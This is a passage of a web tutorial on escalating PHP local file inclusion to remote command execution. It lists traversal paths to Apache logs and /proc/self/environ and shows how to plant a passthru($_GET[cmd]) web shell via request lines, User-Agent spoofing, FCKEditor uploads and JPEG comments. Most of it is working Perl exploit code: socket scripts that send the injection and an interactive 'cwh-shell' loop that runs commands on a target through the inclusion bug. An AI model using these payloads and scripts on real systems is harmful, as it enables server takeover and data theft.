</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache2</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span></code></pre></div><h2 id="lfi-to-rce-via-process-environ">LFI to RCE via Process Environ</h2>
<ul>
<li>When a request is made to a PHP page, a new process is created.</li>
<li>On a <strong>Unix-like system</strong>, each process has its own <code>/proc</code> entry.</li>
<li>The <code>/proc/self/</code> is a symbolic link to the latest process used, and contains useful information.</li>
<li>If malicious code is injected into <code>/proc/self/environ</code>, the attacker can run arbitrary commands from the target using LFI.</li>
</ul>
<blockquote>
<p>[The Question] How to inject code into <code>/proc/self/environ</code> ?
[The Answer]   We can inject thru <strong>User-Agent</strong>.</p>
</blockquote>
<p>In Firefox, we use &ldquo;<a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">User Agent Switcher Add-ons</a>&rdquo; that can specify your user agent manually.</p>
<p>For instance, a piece of /proc/self/environ would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PATH</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">X11R6</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SERVER_ADMIN</span><span style="color:#f92672">=</span><span style="color:#a6e22e">root</span><span style="color:#f92672">@</span><span style="color:#a6e22e">hackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span>; <span style="color:#a6e22e">U</span>; <span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">5.1</span>; <span style="color:#a6e22e">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>; <span style="color:#a6e22e">rv</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1.9</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.4</span>) 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Gecko</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2008102920</span> <span style="color:#a6e22e">Firefox</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span> <span style="color:#a6e22e">HTTP_KEEP_ALIVE</span><span style="color:#f92672">=</span><span style="color:#ae81ff">300</span>    <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">It</span> <span style="color:#a6e22e">contains</span> <span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">agent</span>
</span></span></code></pre></div><p>When we injected <!-- raw HTML omitted --> into our User Agent, <code>/proc/self/environ</code> will contain Malicious code like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PATH</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">X11R6</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SERVER_ADMIN</span><span style="color:#f92672">=</span><span style="color:#a6e22e">root</span><span style="color:#f92672">@</span><span style="color:#a6e22e">hackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">passthru</span>($_GET[<span style="color:#a6e22e">cmd</span>])<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> HTTP_KEEP_ALIVE=300      &lt;-- Injected Malicious code
</span></span></span></code></pre></div><p>Then Go to <a href="https://www.hackme.com/index.php?p=../../../../../proc/self/environ%00&amp;cmd=ls">www.hackme.com/index.php?p=../../../../../proc/self/environ%00&amp;cmd=ls</a> -la</p>
<p>üí° Author don&rsquo;t recommend to use this method because It&rsquo;s immediately to inject code and run command before self link change to other process.</p>
<h2 id="lfi-to-rce-via-other-files">LFI to RCE via Other Files</h2>
<ul>
<li>Older versions of <code>FCKEditor</code> have vulnerabilities that allow for uploading of multiple file extensions, including those not specified in the FCKEditor Config&rsquo;s DeniedExtensions.</li>
<li>If the website has a vulnerability in Local File Inclusion, the attacker can inject malicious code into the uploaded file and use LFI traversal with the uploaded file link to run arbitrary commands.</li>
</ul>
<p>For example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#a6e22e">LFI</span> <span style="color:#a6e22e">Vulnerable</span>] <span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">p</span><span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">Uploaded</span> <span style="color:#a6e22e">File</span>]  <span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">userfiles</span><span style="color:#f92672">/</span><span style="color:#a6e22e">upload</span><span style="color:#f92672">/</span><span style="color:#a6e22e">shell</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cwh</span>
</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">LFI</span> <span style="color:#f92672">&lt;&gt;</span> <span style="color:#a6e22e">RCE</span>]   <span style="color:#a6e22e">www</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hackme</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">p</span><span style="color:#f92672">=./</span><span style="color:#a6e22e">userfiles</span><span style="color:#f92672">/</span><span style="color:#a6e22e">upload</span><span style="color:#f92672">/</span><span style="color:#a6e22e">shell</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cwh</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ls</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">la</span>
</span></span></code></pre></div><ul>
<li>Many websites in the world allow for the uploading of image files, but only check the file extension (e.g. .jpg, .gif) before allowing the upload. This can be vulnerable.</li>
<li>An attacker can inject malicious code into an image file (e.g. using a tool like <strong><a href="http://www.chapelhill.homeip.net/horton/copies/edjpgcom/edjpgcom%20-%20A%20JPEG%20Comment%20Editor.htm">edjpgcom</a></strong> to insert PHP code into a jpeg file or changing the file extension to an image file manually).</li>
<li>After uploading the malicious image file to the target server, the attacker can use the Local File Inclusion (LFI) technique to traverse to the uploaded file and execute arbitrary commands.</li>
</ul>
<hr>
<h1 id="fundamental-of-perl-library-for-exploit-website">Fundamental of Perl Library for Exploit Website</h1>
<h2 id="introduction-to-socket">Introduction to Socket</h2>
<ul>
<li>A socket is a method used to <strong>create a connection</strong> between two hosts.</li>
<li>Sockets are used to send manipulated requests to a server by creating a connection between the attacker&rsquo;s computer and a remote server.</li>
<li>Information required to create one includes the protocol, server address, server port, and data.</li>
<li>In Perl, the <code>IO::Socket</code> library can be used to create a socket.</li>
</ul>
<p>Syntax for create a socket is following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span> (PROTOCAL, PEERADDR, PEERPORT);
</span></span></code></pre></div><p>For Example: If we want to create socket to port <code>80</code> on server ip <code>192.168.0.111</code> with tcp protocol,
we can use following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span></code></pre></div><p>when we want to send http request through this socket, we can use this syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">print</span> $socket $data;
</span></span></code></pre></div><p>For Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;GET /index.php HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Host: 192.168.0.111\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Connection: close\r\n\r\n&#34;</span>;
</span></span></code></pre></div><p>After finish using socket, we have to close the socket by this syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>close ($socket);
</span></span></code></pre></div><p>Finally, we can group the entire code together:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> IO::Socket;
</span></span><span style="display:flex;"><span>  $socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;GET /index.php HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Host: 192.168.0.111\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Connection: close\r\n\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  close ($socket);
</span></span></code></pre></div><p>üí° In Breif: This code creates a <strong>TCP socket</strong> and connects to a server at the <strong>host address</strong> and port <strong>80</strong>. It then sends a <code>GET</code> request for the file &ldquo;<code>index.php</code>&rdquo; to the server, along with the Host and Connection header fields. The request is formatted according to the HTTP/1.1 protocol, Then closes the socket connection after sending the request.</p>
<h2 id="introduction-to-library-for-www-in-perl-lwp">Introduction to Library for WWW in Perl (LWP)</h2>
<p><code>LWP</code> is a set of perl module designed to handle sending of http request. Usually we use this library
simultaneously with <code>HTTP::Request</code> and <code>HTTP::Response</code>.</p>
<p>If we speak clearly, we can classify a role of these library as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#f92672">-</span> HTTP::Request  <span style="color:#f92672">=&gt;</span> used to manipulate http request<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> LWP::UserAgent <span style="color:#f92672">=&gt;</span> used to sent http request<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> HTTP::Response <span style="color:#f92672">=&gt;</span> used to handle http response<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>If we want to use these libraries to obtain content from <code>index.php</code> file on <code>192.168.0.111</code>,
we can following these steps:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> LWP;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> HTTP::Request;
</span></span><span style="display:flex;"><span>  $request <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span> (GET <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://192.168.0.111/index.php&#34;</span>);
</span></span><span style="display:flex;"><span>  $request<span style="color:#f92672">-&gt;</span>header (User_Agent <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Mozilla 2.0&#34;</span>);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  $ua <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>();
</span></span><span style="display:flex;"><span>  $response <span style="color:#f92672">=</span> $ua<span style="color:#f92672">-&gt;</span>request ($request);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $response<span style="color:#f92672">-&gt;</span>header<span style="color:#f92672">-&gt;</span>as_string;  <span style="color:#75715e">## $response-&gt;header is an object of HTTP::Header</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">## It cannot to print as string, </span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">## so we use as_string method to solve this problem</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $response<span style="color:#f92672">-&gt;</span>content;
</span></span></code></pre></div><p>üí° In this request, we send a GET request to the URL ‚Äú<a href="http://192.168.0.111/index.php">http://192.168.0.111/index.php</a>&quot;.
The User_Agent header is set to &ldquo;Mozilla 2.0&rdquo;. The code creates a UserAgent object using LWP and sends the request. The response headers are then printed as a string and the response content is also printed.</p>
<h2 id="condition-to-use-socket-or-lwp">Condition to use Socket or LWP</h2>
<p>To summarize:</p>
<ul>
<li>Use <code>Socket</code> when you want to inject <strong>raw HTTP request</strong> packets to the server and don&rsquo;t require the response.</li>
<li>Use <code>LWP</code> when you want to receive the <strong>HTTP response</strong> and it&rsquo;s more convenient for your needs.</li>
</ul>
<hr>
<h1 id="writing-lfi-to-rce-exploit-with-perl-script">Writing LFI to RCE Exploit with Perl Script</h1>
<h2 id="perl-exploit-to-injecting-code-into-target">Perl Exploit to Injecting code into Target</h2>
<ul>
<li>There are several ways to inject PHP code into a server.</li>
<li>To create a Perl script to send a malicious request, the script will use sockets.</li>
<li>Before writing the Perl script, it&rsquo;s necessary to determine which file the code will be injected into and the method for doing so.</li>
</ul>
<h3 id="inject-via-logfile">Inject via logfile</h3>
<p>Logfiles are written when there is a request to a file on server. Thus we can manipulate http request in order to inject malicious code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;GET /cwhunderground &lt;? passthru(\$_GET[cmd]); ?&gt; HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;host: 192.168.0.111\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Connection: close\r\n\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  close ($socket);
</span></span></code></pre></div><h3 id="inject-via-other-files">Inject via Other files</h3>
<p>In some websites, they allow us to upload files. If we know the path to uploaded file,  we can use LFI vulnerability to execute command in our uploaded file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;POST /uploadsave.php HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;host: 192.168.0.111\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Content-Type: multipart/form-data; boundary=CwHCwH\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;--CwHCwH\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Content-Disposition: form-data; name=\&#34;shell.cwh\&#34;; filename=\&#34;shell.cwh\&#34;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Content-Type: application/zip\r\n\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;&lt;? passthru(\$_GET[cmd]); ?&gt;\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;--CwHCwH\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  close ($socket);
</span></span></code></pre></div><h3 id="inject-via-process-environment">Inject via process environment</h3>
<p>In process environment file, there is user agent of using browser as a part of content.
Therefore we can inject malicious code by <strong>spoofing user agent</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>$socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;GET /index.php HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;host: 192.168.0.111\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;User-Agent: &lt;? passthru(\$_GET[cmd]); ?&gt;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Connection: close\r\n\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  close ($socket);
</span></span></code></pre></div><hr>
<h1 id="perl-exploit-to-executing-injected-code-on-target">Perl Exploit to Executing injected code on Target</h1>
<p>In this section, we will show how to create script to execute our code on server.</p>
<h3 id="execute-code-from-logfile">Execute code from logfile</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> LWP;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> HTTP::Request;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $logfile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../../../../var/log/httpd/access.log&#34;</span>;    <span style="color:#f92672">&lt;--</span> We must specify Logfile locations
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## looping for execute command and exit program when command = exit ##</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>  chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>($cmd <span style="color:#f92672">!~</span> <span style="color:#e6db74">&#34;exit&#34;</span>) 
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>     $request <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span> (GET <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://192.168.0.111/path/to/lfi.php?file=&#34;</span><span style="color:#f92672">.</span>$logfile<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;%00&amp;cmd=&#34;</span><span style="color:#f92672">.</span>$cmd);
</span></span><span style="display:flex;"><span>     $ua <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>();
</span></span><span style="display:flex;"><span>     $response <span style="color:#f92672">=</span> $ua<span style="color:#f92672">-&gt;</span>request ($request);
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> $response<span style="color:#f92672">-&gt;</span>content;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> $content<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>     chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h3 id="execute-code-from-other-files">Execute code from Other files</h3>
<blockquote>
<p>I assume that the uploaded file is ../../../path/to/uploaded/file/shell.cwh .</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> LWP;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> HTTP::Request;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $uploadedfile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../../../path/to/uploaded/file/shell.cwh&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## looping for execute command and exit program when command = exit ###</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>  chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>($cmd <span style="color:#f92672">!~</span> <span style="color:#e6db74">&#34;exit&#34;</span>) 
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>     $request <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span> (GET <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://192.168.0.111/path/to/lfi.php?file=&#34;</span><span style="color:#f92672">.</span>$uploadedfile<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;%00&amp;cmd=&#34;</span><span style="color:#f92672">.</span>$cmd);
</span></span><span style="display:flex;"><span>     $ua <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>();
</span></span><span style="display:flex;"><span>     $response <span style="color:#f92672">=</span> $ua<span style="color:#f92672">-&gt;</span>request ($request);
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> $response<span style="color:#f92672">-&gt;</span>content;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> $content<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>     chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h3 id="execute-code-from-process-environment">Execute code from process environment</h3>
<p>The injected process environment file is /proc/self/environ.
So, we have to traversal back to root path by using <code>../../</code></p>
